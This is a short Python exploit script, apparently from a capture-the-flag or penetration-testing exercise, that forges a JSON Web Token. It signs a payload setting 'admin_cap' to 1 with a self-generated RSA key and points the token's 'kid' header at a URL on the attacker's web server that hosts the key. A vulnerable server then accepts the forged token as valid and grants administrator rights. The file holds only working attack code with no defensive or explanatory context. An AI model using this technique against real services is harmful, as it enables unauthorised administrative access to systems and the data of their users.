import jwt

# ssh-keygen -t rsa -b 4096 -m PEM -f id_rsa

id_rsa= """
<your id_rsa file content goes here>"""



payload = {
  "username": "morph3",
  "email": "asd@asd.com",
  "admin_cap": 1
}
token = jwt.encode(payload, id_rsa, algorithm='RS256',headers = {"kid" : "http://<webserverip>/id_rsa"})
print(token.decode())
